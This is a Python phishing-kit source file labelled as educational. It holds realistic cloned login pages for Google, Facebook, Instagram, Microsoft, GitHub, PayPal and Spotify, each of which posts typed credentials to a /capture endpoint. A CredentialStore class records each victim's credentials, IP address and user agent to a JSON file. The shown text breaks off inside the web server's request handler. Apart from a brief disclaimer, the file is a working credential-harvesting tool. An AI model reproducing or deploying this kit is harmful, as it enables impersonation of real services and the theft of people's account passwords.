#!/usr/bin/env python3
"""
PHISH-KIT - Educational Phishing Framework
For authorized penetration testing and security education only.
Unauthorized use is illegal and unethical.
"""

import os
import sys
import json
import time
import socket
import base64
import argparse
import threading
import subprocess
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

# ANSI Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'

BANNER = f"""
{RED}{BOLD}
╔══════════════════════════════════════════════════════════════╗
║  ____  _     _     _     _ _      _   _                 _ _  ║
║ |  _ \\| |__ (_)___| |__ (_) | ___| |_| | ____ _ _ __ __| | | ║
║ | |_) | '_ \\| / __| '_ \\| | |/ _ \\ __| |/ / _` | '__/ _` | | ║
║ |  __/| | | | \\__ \\ | | | | |  __/ |_|   < (_| | | | (_| |_| ║
║ |_|   |_| |_|_|___/_| |_|_|_|\\___|\\__|_|\\_\\__,_|_|  \\__,_(_) ║
╠══════════════════════════════════════════════════════════════╣
║     Educational Phishing Framework - Use Responsibly         ║
╚══════════════════════════════════════════════════════════════╝{RESET}
"""

# HTML Templates for various services
TEMPLATES = {
    'google': """
<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Roboto', sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; }
        .logo { text-align: center; margin-bottom: 24px; }
        .logo img { height: 32px; }
        h1 { font-size: 24px; font-weight: 400; text-align: center; color: #202124; margin-bottom: 8px; }
        h2 { font-size: 16px; font-weight: 400; text-align: center; color: #5f6368; margin-bottom: 32px; }
        .input-group { margin-bottom: 24px; }
        input[type="email"], input[type="password"], input[type="text"] {
            width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0;
            border-radius: 4px; outline: none; transition: border-color 0.2s;
        }
        input:focus { border-color: #1a73e8; border-width: 2px; padding: 12px 14px; }
        .btn { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 16px; }
        .btn:hover { background: #1557b0; }
        .links { text-align: center; margin-top: 24px; }
        .links a { color: #1a73e8; text-decoration: none; font-size: 14px; }
        .links a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 272 92" width="75"><path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.98 5.79 13.44 12.51 13.44s12.51-5.46 12.51-13.44z"/><path fill="#EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.98 5.79 13.44 12.51 13.44s12.51-5.46 12.51-13.44z"/><path fill="#FBBC05" d="M209.75 26.34v39.82c0 16.38-9.66 23.34-21.08 23.34-10.75 0-17.22-7.19-19.66-13.07l8.49-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.23 21.25-22.23 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/><path fill="#4285F4" d="M225 3v65h-9.5V3h9.5z"/><path fill="#34A853" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/><path fill="#EA4335" d="M35.29 41.41V32H67c.31-1.79.47-3.72.47-5.83C67.47 14.52 58.15 4 44.63 4 32.25 4 22 14.15 22 27.66c0 13.51 10.25 23.66 22.63 23.66 6.05 0 11.17-2.01 15.01-5.38L49.8 36.5c-1.28 1.93-3.91 4.22-7.17 4.22-4.62 0-8.54-3.87-9.45-9.26H35.5c-.1-.52-.21-1.04-.21-1.56v-1.49zM44.63 13.99c4.34 0 7.77 2.89 9.35 7.17H35.28c1.58-4.28 5.01-7.17 9.35-7.17z"/></svg>
        </div>
        <h1>Sign in</h1>
        <h2>Use your Google Account</h2>
        <form action="/capture" method="POST">
            <input type="hidden" name="service" value="google">
            <div class="input-group">
                <input type="email" name="email" placeholder="Email or phone" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="btn">Next</button>
        </form>
        <div class="links">
            <a href="#">Forgot email?</a>
            <br><br>
            <a href="#">Create account</a>
        </div>
    </div>
</body>
</html>
    """,
    
    'facebook': """
<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In or Sign Up</title>
    <meta charset="UTF-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { display: flex; align-items: center; gap: 40px; max-width: 980px; padding: 20px; }
        .left { flex: 1; }
        .logo { color: #1877f2; font-size: 55px; font-weight: bold; margin-bottom: 16px; }
        .tagline { font-size: 28px; line-height: 32px; color: #1c1e21; }
        .right { flex: 1; }
        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 396px; }
        input[type="text"], input[type="password"] {
            width: 100%; padding: 14px 16px; font-size: 17px; border: 1px solid #dddfe2;
            border-radius: 6px; margin-bottom: 12px; outline: none;
        }
        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
        .login-btn { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; margin-bottom: 16px; }
        .login-btn:hover { background: #166fe5; }
        .forgot { text-align: center; margin-bottom: 20px; }
        .forgot a { color: #1877f2; font-size: 14px; text-decoration: none; }
        .forgot a:hover { text-decoration: underline; }
        .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
        .create-btn { display: block; width: fit-content; margin: 0 auto; padding: 14px 16px; background: #42b72a; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; text-decoration: none; }
        .create-btn:hover { background: #36a420; }
        .create-page { margin-top: 28px; text-align: center; font-size: 14px; color: #1c1e21; }
        .create-page a { font-weight: bold; color: #1c1e21; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="left">
            <div class="logo">facebook</div>
            <div class="tagline">Connect with friends and the world around you on Facebook.</div>
        </div>
        <div class="right">
            <div class="login-box">
                <form action="/capture" method="POST">
                    <input type="hidden" name="service" value="facebook">
                    <input type="text" name="email" placeholder="Email or phone number" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit" class="login-btn">Log In</button>
                </form>
                <div class="forgot">
                    <a href="#">Forgot password?</a>
                </div>
                <div class="divider"></div>
                <a href="#" class="create-btn">Create New Account</a>
            </div>
            <div class="create-page">
                <a href="#">Create a Page</a> for a celebrity, brand or business.
            </div>
        </div>
    </div>
</body>
</html>
    """,
    
    'instagram': """
<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <meta charset="UTF-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 350px; }
        .box { background: white; border: 1px solid #dbdbdb; padding: 40px 40px 20px; margin-bottom: 10px; text-align: center; }
        .logo { margin-bottom: 30px; }
        .logo img { width: 175px; }
        input { width: 100%; padding: 9px 8px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; margin-bottom: 6px; }
        input:focus { outline: none; border-color: #a8a8a8; }
        button { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; font-size: 14px; margin-top: 10px; cursor: pointer; }
        button:hover { background: #0077c2; }
        .or { margin: 18px 0; position: relative; }
        .or::before, .or::after { content: ''; position: absolute; top: 50%; width: 40%; height: 1px; background: #dbdbdb; }
        .or::before { left: 0; }
        .or::after { right: 0; }
        .or span { color: #8e8e8e; font-size: 13px; font-weight: 500; }
        .fb-login { color: #385185; font-size: 14px; font-weight: 600; margin: 15px 0; cursor: pointer; }
        .forgot { color: #00376b; font-size: 12px; margin-top: 15px; }
        .signup { padding: 25px 0; }
        .signup p { font-size: 14px; }
        .signup a { color: #0095f6; text-decoration: none; font-weight: 600; }
        .get-app { text-align: center; margin-top: 20px; }
        .get-app p { font-size: 14px; margin-bottom: 20px; }
        .app-stores img { height: 40px; margin: 0 4px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="box">
            <div class="logo">
                <svg width="175" height="51" viewBox="0 0 175 51"><path fill="#262626" d="M50.7 25.3c0-14.1-11.4-25.6-25.6-25.6S-0.4 11.1-0.4 25.3s11.4 25.6 25.6 25.6c6.9 0 13.2-2.7 17.8-7.2l-3.4-3.8c-3.6 3.3-8.4 5.4-13.7 5.4-11.3 0-20.5-9.2-20.5-20.5S13.6 4.8 24.9 4.8s20.5 9.2 20.5 20.5c0 5.1-1.9 9.8-5 13.4l3.5 3.9c4.2-4.6 6.8-10.8 6.8-17.3z"/><path fill="#262626" d="M24.9 16.8c-4.7 0-8.5 3.8-8.5 8.5s3.8 8.5 8.5 8.5 8.5-3.8 8.5-8.5-3.8-8.5-8.5-8.5zm0 13.5c-2.8 0-5-2.2-5-5s2.2-5 5-5 5 2.2 5 5-2.2 5-5 5z"/><path fill="#262626" d="M42.3 4.8h5.1v40.9h-5.1z"/><path fill="#262626" d="M63.1 16.8c-4.7 0-8.5 3.8-8.5 8.5s3.8 8.5 8.5 8.5 8.5-3.8 8.5-8.5-3.8-8.5-8.5-8.5zm0 13.5c-2.8 0-5-2.2-5-5s2.2-5 5-5 5 2.2 5 5-2.2 5-5 5z"/><path fill="#262626" d="M54.6 12.8h5.1v26h-5.1z"/><path fill="#262626" d="M73.4 25.3c0-4.7 3.8-8.5 8.5-8.5s8.5 3.8 8.5 8.5c0 5.3-2.9 8.7-8.5 8.7-4.7 0-8.5-3.8-8.5-8.5v-0.2zm8.5 13.5c8.1 0 13.6-6.1 13.6-13.5S90 11.8 81.9 11.8s-13.6 6.1-13.6 13.5 5.5 13.5 13.6 13.5z"/><path fill="#262626" d="M127.9 32.3c0 2.1-1.7 3.8-3.8 3.8h-0.5c-2.1 0-3.8-1.7-3.8-3.8V12.8h-5.1v20.1c0 4.7 3.8 8.5 8.5 8.5h1.3c4.7 0 8.5-3.8 8.5-8.5V12.8h-5.1v19.5z"/><path fill="#262626" d="M149 11.8c-5.1 0-9.4 3.4-10.6 8.1h5c0.9-1.9 2.8-3.2 5.1-3.2 3.1 0 5.6 2.5 5.6 5.6v0.5h-5.3c-5.2 0-10.4 2.9-10.4 8.6 0 5.1 4.2 8.1 9.2 8.1 3.5 0 6.6-1.7 8.4-4.3v3.6h5.1v-19c0-4.3-3.5-7.8-7.8-7.8v0.4l1.1 0.5zm-0.5 24.7c-2.6 0-4.8-1.3-4.8-3.9 0-2.6 2.2-3.9 4.8-3.9h5v1.1c-0.1 3.5-2.5 6.7-4.8 6.7h-0.2z"/><path fill="#262626" d="M99.8 12.8h5.1v26h-5.1z"/><path fill="#262626" d="M102.4 4c-1.7 0-3 1.3-3 3s1.3 3 3 3 3-1.3 3-3-1.3-3-3-3z"/></svg>
            </div>
            <form action="/capture" method="POST">
                <input type="hidden" name="service" value="instagram">
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            <div class="or"><span>OR</span></div>
            <div class="fb-login">Log in with Facebook</div>
            <div class="forgot">Forgot password?</div>
        </div>
        <div class="box signup">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
        <div class="get-app">
            <p>Get the app.</p>
            <div class="app-stores">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png" alt="App Store">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png" alt="Play Store">
            </div>
        </div>
    </div>
</body>
</html>
    """,
    
    'microsoft': """
<!DOCTYPE html>
<html>
<head>
    <title>Sign in to your Microsoft account</title>
    <meta charset="UTF-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 440px; padding: 0 20px; }
        .box { background: white; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
        .logo { margin-bottom: 16px; }
        .logo img { width: 108px; }
        h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 12px; }
        input { width: 100%; padding: 12px 0; border: none; border-bottom: 2px solid rgba(0,0,0,0.6); font-size: 15px; margin: 16px 0; outline: none; }
        input:focus { border-bottom-color: #0067b8; }
        .signin-btn { width: 108px; padding: 8px; background: #0067b8; color: white; border: none; font-size: 15px; cursor: pointer; margin-top: 20px; }
        .signin-btn:hover { background: #005a9e; }
        .account-actions { display: flex; justify-content: space-between; margin-top: 20px; font-size: 13px; }
        .account-actions a { color: #0067b8; text-decoration: none; }
        .account-actions a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <div class="box">
            <div class="logo">
                <svg width="108" height="23" viewBox="0 0 108 23"><path fill="#737373" d="M46.2 9.8c0-1.4-0.6-2.4-1.7-2.4-1.1 0-1.7 1-1.7 2.4 0 1.4 0.6 2.4 1.7 2.4 1.1 0.1 1.7-1 1.7-2.4zm-4.6 0c0-1.9 0.9-3.3 2.9-3.3s2.9 1.4 2.9 3.3-0.9 3.3-2.9 3.3-2.9-1.4-2.9-3.3z"/><path fill="#737373" d="M51.6 6.5v6.5h-0.9v-6.5h-1.3v-0.8h3.5l-0.2 0.8h-1.1z"/><path fill="#737373" d="M56.3 6.5v3.9c0 1.6 0.7 2.2 1.6 2.2s1.6-0.6 1.6-2.2v-3.9h0.9v3.9c0 2.1-1 3-2.5 3s-2.5-0.9-2.5-3v-3.9h0.9z"/><path fill="#737373" d="M63.2 6.3v3.8l2.6-3.8h1v6.7h-0.9V8.1l-2.6 3.8v0.1h-1v-5.6h0.9v-0.1z"/><path fill="#737373" d="M73.3 6.5c1.9 0 2.8 1 2.8 2.4 0 1.5-0.9 2.5-2.7 2.5h-1.6v1.6h-0.9V6.5h1.4zm-0.9 0.8v3.3h0.8c1.3 0 1.9-0.7 1.9-1.7 0-0.9-0.6-1.6-1.9-1.6h-0.8z"/><path fill="#737373" d="M79 6.5v5.9h2.3v0.8h-3.2v-6.7h0.9z"/><path fill="#737373" d="M84.1 6.5v6.5h-0.9v-6.5h-1.3v-0.8h3.5l-0.2 0.8h-1.1z"/><path fill="#737373" d="M87.7 12.5c1.8 0 2.7-1.4 2.7-3s-0.9-3-2.7-3c-1.8 0-2.7 1.4-2.7 3s0.9 3 2.7 3zm0-5.9c2.4 0 3.7 1.7 3.7 2.9 0 1.3-1.2 2.9-3.7 2.9s-3.7-1.7-3.7-2.9c0-1.3 1.2-2.9 3.7-2.9z"/><path fill="#737373" d="M93.7 5.7h0.9v7.3h-0.9v-7.3z"/><path fill="#737373" d="M96.5 5.7h0.9v7.3h-0.9v-7.3z"/><path fill="#737373" d="M99.8 12.5c1.8 0 2.7-1.4 2.7-3s-0.9-3-2.7-3c-1.8 0-2.7 1.4-2.7 3s0.9 3 2.7 3zm0-5.9c2.4 0 3.7 1.7 3.7 2.9 0 1.3-1.2 2.9-3.7 2.9s-3.7-1.7-3.7-2.9c0-1.3 1.2-2.9 3.7-2.9z"/><path fill="#737373" d="M108 13V6.5h-0.9v5c-0.9-1.1-1.5-1.3-2.3-1.3-1.8 0-2.8 1.4-2.8 3.1 0 1.7 1 3.1 2.8 3.1 0.8 0 1.5-0.3 2.3-1.3v1.1c0.1 0.3 0.4 0.6 0.9 0.6V13zm-0.9-.3c-0.4 0.7-1.1 1.2-1.9 1.2-1.2 0-2-1-2-2.2s0.8-2.2 2-2.2c0.8 0 1.5 0.4 1.9 1.2v2z"/><path fill="#F25022" d="M0 0h11v11H0z"/><path fill="#7FBA00" d="M12 0h11v11H12z"/><path fill="#00A4EF" d="M0 12h11v11H0z"/><path fill="#FFB900" d="M12 12h11v11H12z"/></svg>
            </div>
            <h1>Sign in</h1>
            <form action="/capture" method="POST">
                <input type="hidden" name="service" value="microsoft">
                <input type="email" name="email" placeholder="Email, phone, or Skype" required>
                <input type="password" name="password" placeholder="Password" required>
                <div class="account-actions">
                    <a href="#">Sign-in options</a>
                </div>
                <button type="submit" class="signin-btn">Sign in</button>
            </form>
        </div>
    </div>
</body>
</html>
    """,
    
    'github': """
<!DOCTYPE html>
<html>
<head>
    <title>Sign in to GitHub - GitHub</title>
    <meta charset="UTF-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif; }
        body { background: #f6f8fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 340px; padding: 0 16px; }
        .logo { text-align: center; margin-bottom: 24px; }
        .box { background: white; border: 1px solid #d0d7de; border-radius: 6px; padding: 24px; }
        label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 400; color: #24292f; }
        input { width: 100%; padding: 8px; font-size: 14px; border: 1px solid #d0d7de; border-radius: 6px; margin-bottom: 16px; outline: none; }
        input:focus { border-color: #0969da; box-shadow: 0 0 0 3px rgba(9,105,218,0.3); }
        .btn { width: 100%; padding: 8px 16px; background: #2c974b; color: white; border: none; border-radius: 6px; font-size: 14px; font-weight: 500; cursor: pointer; margin-top: 20px; }
        .btn:hover { background: #2a8f47; }
        .forgot { float: right; font-size: 12px; color: #0969da; text-decoration: none; }
        .forgot:hover { text-decoration: underline; }
        .create-acc { margin-top: 16px; padding: 16px; border: 1px solid #d0d7de; border-radius: 6px; background: white; text-align: center; font-size: 14px; }
        .create-acc a { color: #0969da; text-decoration: none; }
        .create-acc a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg height="48" viewBox="0 0 16 16" version="1.1" width="48"><path fill-rule="evenodd" fill="#24292f" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg>
        </div>
        <div class="box">
            <form action="/capture" method="POST">
                <input type="hidden" name="service" value="github">
                <label for="login">Username or email address</label>
                <input type="text" id="login" name="login" required>
                <label for="password">Password
                    <a href="#" class="forgot">Forgot password?</a>
                </label>
                <input type="password" id="password" name="password" required>
                <button type="submit" class="btn">Sign in</button>
            </form>
        </div>
        <div class="create-acc">
            New to GitHub? <a href="#">Create an account</a>.
        </div>
    </div>
</body>
</html>
    """,
    
    'paypal': """
<!DOCTYPE html>
<html>
<head>
    <title>Log in to your PayPal account</title>
    <meta charset="UTF-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: PayPalOpen-Regular, Helvetica, Arial, sans-serif; }
        body { background: #f7f9fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 460px; padding: 20px; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 130px; }
        .box { background: white; padding: 40px; border-radius: 5px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
        .input-group { margin-bottom: 20px; }
        input { width: 100%; padding: 15px 12px; border: 1px solid #9da3a6; border-radius: 4px; font-size: 16px; outline: none; margin-top: 8px; }
        input:focus { border-color: #0070e0; }
        label { color: #2c2e2f; font-size: 15px; font-weight: 600; }
        .btn { width: 100%; padding: 15px; background: #0070e0; color: white; border: none; border-radius: 25px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
        .btn:hover { background: #005ea3; }
        .forgot { text-align: center; margin-top: 20px; }
        .forgot a { color: #0070e0; text-decoration: none; font-size: 15px; }
        .forgot a:hover { text-decoration: underline; }
        .signup { text-align: center; margin-top: 30px; font-size: 15px; }
        .signup a { color: #0070e0; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 130 33" xmlns="http://www.w3.org/2000/svg"><path fill="#003087" d="M46.211 13.763h-8.76c-.555 0-1.018.403-1.104.95l-.357 2.27c-.082.521.319.987.847.987h2.211c.526 0 .963.404 1.047.947l.145.916c.084.543-.32 1.028-.845 1.028h-2.328c-.555 0-1.018.403-1.104.95l-.285 1.813c-.082.523.322.99.853.99h11.697c.556 0 1.02-.406 1.104-.955l1.294-8.215c.082-.52-.32-.985-.848-.985h-2.465c-.554 0-1.017-.403-1.104-.949l-.293-1.86c-.082-.521.32-.988.85-.988h2.487c.553 0 1.016-.403 1.103-.947l.288-1.831c.082-.523-.321-.992-.853-.992h-4.167c-.556 0-1.02.406-1.104.955l-.287 1.826c-.082.52.32.986.848.986h1.528s-.375 2.379-.444 2.819h-1.313l.445-2.819c.084-.543-.32-1.028-.845-1.028h-2.487c-.554 0-1.017-.403-1.104-.949L38.744 6.17c-.082-.521.32-.988.85-.988h8.645c.553 0 1.016-.403 1.103-.947l.288-1.831c.082-.523-.321-.992-.853-.992h-11.38c-.556 0-1.02.406-1.104.955l-1.294 8.215c-.082.52.32.985.848.985h2.211z"/><path fill="#0070e0" d="M61.858 10.258h-8.76c-.555 0-1.018.403-1.104.95l-.357 2.27c-.082.521.319.987.847.987h2.211c.526 0 .963.404 1.047.947l.145.916c.084.543-.32 1.028-.845 1.028h-2.328c-.555 0-1.018.403-1.104.95l-.285 1.813c-.082.523.322.99.853.99h11.697c.556 0 1.02-.406 1.104-.955l1.294-8.215c.082-.52-.32-.985-.848-.985h-2.465c-.554 0-1.017-.403-1.104-.949l-.293-1.86c-.082-.521.32-.988.85-.988h2.487c.553 0 1.016-.403 1.103-.947l.288-1.831c.082-.523-.321-.992-.853-.992h-4.167c-.556 0-1.02.406-1.104.955l-.287 1.826c-.082.52.32.986.848.986h1.528s-.375 2.379-.444 2.819h-1.313l.445-2.819c.084-.543-.32-1.028-.845-1.028h-2.487c-.554 0-1.017-.403-1.104-.949L54.391 6.17c-.082-.521.32-.988.85-.988h8.645c.553 0 1.016-.403 1.103-.947l.288-1.831c.082-.523-.321-.992-.853-.992h-11.38c-.556 0-1.02.406-1.104.955l-1.294 8.215c-.082.52.32.985.848.985h2.211z"/><path fill="#003087" d="M21.443 11.113h2.211c.526 0 .963.404 1.047.947l.048.304c.138.875.907 1.514 1.804 1.514h4.418c.408 0 .795-.137 1.109-.374l.379-.284c.481-.361.761-.924.761-1.523 0-1.156-.942-2.097-2.1-2.097h-4.351c-.556 0-1.018-.402-1.104-.949l-.286-1.814c-.082-.522.319-.988.845-.988h5.238c.529 0 .99-.318 1.186-.795l.38-.916c.167-.403.014-.868-.359-1.106l-.401-.261a1.116 1.116 0 00-.606-.179h-6.28c-.556 0-1.019.406-1.104.955l-1.38 8.766c-.081.52.322.986.85.986.297 0 .576-.152.737-.403l.048-.076zm1.13-3.943c.084-.542-.32-1.027-.845-1.027h-2.211c-.555 0-1.018.403-1.104.95l-.357 2.27c-.082.521.319.987.847.987h2.211c.526 0 .963-.404 1.047-.947l.412-2.233z"/></svg>
        </div>
        <div class="box">
            <form action="/capture" method="POST">
                <input type="hidden" name="service" value="paypal">
                <div class="input-group">
                    <label for="email">Email</label>
                    <input type="email" id="email" name="email" required>
                </div>
                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit" class="btn">Log In</button>
            </form>
            <div class="forgot">
                <a href="#">Forgot password?</a>
            </div>
        </div>
        <div class="signup">
            <a href="#">Sign Up</a>
        </div>
    </div>
</body>
</html>
    """,
    
    'spotify': """
<!DOCTYPE html>
<html>
<head>
    <title>Spotify - Login</title>
    <meta charset="UTF-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Circular, Helvetica, Arial, sans-serif; }
        body { background: #121212; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: white; }
        .container { width: 100%; max-width: 450px; padding: 32px; }
        .logo { text-align: center; margin-bottom: 32px; }
        .logo svg { width: 40px; fill: white; }
        h1 { text-align: center; font-size: 28px; font-weight: 700; margin-bottom: 32px; }
        .divider { text-align: center; margin: 24px 0; color: #a7a7a7; font-size: 12px; text-transform: uppercase; position: relative; }
        .divider::before, .divider::after { content: ''; position: absolute; top: 50%; width: 40%; height: 1px; background: #333; }
        .divider::before { left: 0; }
        .divider::after { right: 0; }
        input { width: 100%; padding: 12px; background: #121212; border: 1px solid #727272; border-radius: 4px; color: white; font-size: 16px; margin-bottom: 16px; outline: none; }
        input:focus { border-color: white; }
        .btn { width: 100%; padding: 14px; background: #1ed760; color: black; border: none; border-radius: 500px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 8px; }
        .btn:hover { transform: scale(1.04); }
        .forgot { text-align: center; margin-top: 16px; }
        .forgot a { color: #1ed760; text-decoration: none; font-size: 14px; }
        .forgot a:hover { text-decoration: underline; }
        .signup { text-align: center; margin-top: 32px; font-size: 14px; color: #a7a7a7; }
        .signup a { color: white; text-decoration: none; font-weight: 700; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 168 168"><path d="M84 0C37.6 0 0 37.6 0 84s37.6 84 84 84 84-37.6 84-84S130.4 0 84 0zm38.5 121.1c-1.5 2.5-4.7 3.2-7.1 1.7-19.5-11.9-44.1-14.6-73-8-2.8.6-5.6-1.2-6.2-4-.6-2.8 1.2-5.6 4-6.2 31.5-7.2 58.4-4.1 80.3 9.4 2.4 1.5 3.2 4.7 1.7 7.1zm10.3-22.9c-1.9 3-5.9 4-8.9 2.1-22.3-13.7-56.3-17.7-82.7-9.7-3.4 1-7.1-.9-8.1-4.3-1-3.4.9-7.1 4.3-8.1 30.2-9.2 67.7-4.7 93 11.1 3 1.9 3.9 5.9 2.1 8.9zm.9-23.8c-26.8-15.9-71-17.4-96.5-9.6-4.1 1.2-8.4-1.1-9.6-5.2-1.2-4.1 1.1-8.4 5.2-9.6 29.3-8.9 78.1-7.3 109.2 11.1 3.7 2.2 4.9 6.9 2.7 10.6-2.2 3.6-6.9 4.9-10.6 2.7z"/></svg>
        </div>
        <h1>Log in to Spotify</h1>
        <form action="/capture" method="POST">
            <input type="hidden" name="service" value="spotify">
            <input type="email" name="email" placeholder="Email or username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" class="btn">Log In</button>
        </form>
        <div class="forgot">
            <a href="#">Forgot your password?</a>
        </div>
        <div class="signup">
            Don't have an account? <a href="#">Sign up for Spotify</a>
        </div>
    </div>
</body>
</html>
    """
}

class CredentialStore:
    def __init__(self, filename="credentials.json"):
        self.filename = filename
        self.credentials = []
        self.load()
        
    def load(self):
        if os.path.exists(self.filename):
            try:
                with open(self.filename, 'r') as f:
                    self.credentials = json.load(f)
            except:
                self.credentials = []
    
    def save(self):
        with open(self.filename, 'w') as f:
            json.dump(self.credentials, f, indent=2)
    
    def add(self, data):
        entry = {
            'timestamp': datetime.now().isoformat(),
            'ip': data.get('ip', 'unknown'),
            'user_agent': data.get('user_agent', 'unknown'),
            'service': data.get('service', 'unknown'),
            'credentials': data.get('credentials', {})
        }
        self.credentials.append(entry)
        self.save()
        return entry

class RequestHandler(BaseHTTPRequestHandler):
    cred_store = None
    
    def log_message(self, format, *args):
        pass  # Suppress default logging
    
    def do_GET(self):
        parsed_path = urlparse(self.path)
        path = parsed_path.path
        
        if path == '/' or path == '/index.html':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            # Selection page
            services_html = ""
